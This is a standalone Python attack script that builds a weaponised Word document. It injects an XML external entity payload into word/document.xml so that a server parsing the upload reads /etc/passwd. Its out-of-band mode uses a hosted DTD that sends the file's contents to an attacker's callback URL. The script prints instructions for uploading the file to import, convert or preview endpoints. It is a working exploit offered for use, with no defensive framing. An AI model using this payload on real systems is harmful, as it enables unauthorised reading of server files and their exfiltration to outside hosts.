#!/usr/bin/env python3
"""
docx_xxe.py — Inject XXE payload into a .docx file
====================================================
Usage:
  python3 docx_xxe.py                          # generates evil.docx reading /etc/passwd
  python3 docx_xxe.py clean.docx output.docx  # inject into existing clean.docx
  python3 docx_xxe.py --oob https://CALLBACK  # OOB blind XXE via DTD

A .docx is a ZIP archive. We inject an XXE into word/document.xml.
The payload fires when the server parses/previews/converts the document.

Requirements: none (stdlib only)
"""
import zipfile, shutil, sys, os, io
from pathlib import Path

# ── Payloads ──────────────────────────────────────────────────────────────────
def payload_local_read(target_file: str = "/etc/passwd") -> str:
    return f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file://{target_file}">
]>
<w:document xmlns:wpc="http://schemas.microsoft.com/office/word/2010/wordprocessingCanvas"
            xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&xxe;</w:t></w:r></w:p>
  </w:body>
</w:document>'''

def payload_oob(callback_url: str) -> str:
    return f'''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE root [
  <!ENTITY % remote SYSTEM "{callback_url}/evil.dtd">
  %remote;
]>
<w:document xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main">
  <w:body>
    <w:p><w:r><w:t>&send;</w:t></w:r></w:p>
  </w:body>
</w:document>
<!-- 
  Host evil.dtd at {callback_url}/evil.dtd with contents:
  <!ENTITY % file SYSTEM "file:///etc/passwd">
  <!ENTITY % wrap "<!ENTITY send SYSTEM '{callback_url}/?x=%file;'>">
  %wrap;
-->'''

# ── Minimal clean docx skeleton ───────────────────────────────────────────────
SKELETON = {
    "[Content_Types].xml": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/content-types">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>''',
    "_rels/.rels": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>''',
    "word/_rels/document.xml.rels": '''<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
</Relationships>''',
}

def create_evil_docx(output_path: str, xml_payload: str):
    """Create a new malicious docx from scratch."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        for name, content in SKELETON.items():
            z.writestr(name, content)
        z.writestr("word/document.xml", xml_payload)
    Path(output_path).write_bytes(buf.getvalue())
    print(f"[+] Created: {output_path}")

def inject_into_docx(src: str, dst: str, xml_payload: str):
    """Inject XXE into an existing docx by replacing word/document.xml."""
    shutil.copy(src, dst)
    buf = io.BytesIO()
    with zipfile.ZipFile(src, "r") as zin:
        with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as zout:
            for item in zin.infolist():
                if item.filename == "word/document.xml":
                    zout.writestr(item, xml_payload)
                else:
                    zout.writestr(item, zin.read(item.filename))
    Path(dst).write_bytes(buf.getvalue())
    print(f"[+] Injected into: {dst}")

def main():
    oob = ""
    if "--oob" in sys.argv:
        idx = sys.argv.index("--oob")
        oob = sys.argv[idx+1] if idx+1 < len(sys.argv) else ""

    xml = payload_oob(oob) if oob else payload_local_read()

    if len(sys.argv) >= 3 and not sys.argv[1].startswith("--"):
        inject_into_docx(sys.argv[1], sys.argv[2], xml)
    else:
        out = "evil.docx"
        create_evil_docx(out, xml)
        print(f"[*] Upload '{out}' to a file upload endpoint (import, convert, preview)")
        print(f"[*] If server parses OOXML server-side, /etc/passwd content will be returned")
        if oob:
            print(f"[*] OOB mode: watch your callback at {oob}")

if __name__ == "__main__":
    main()
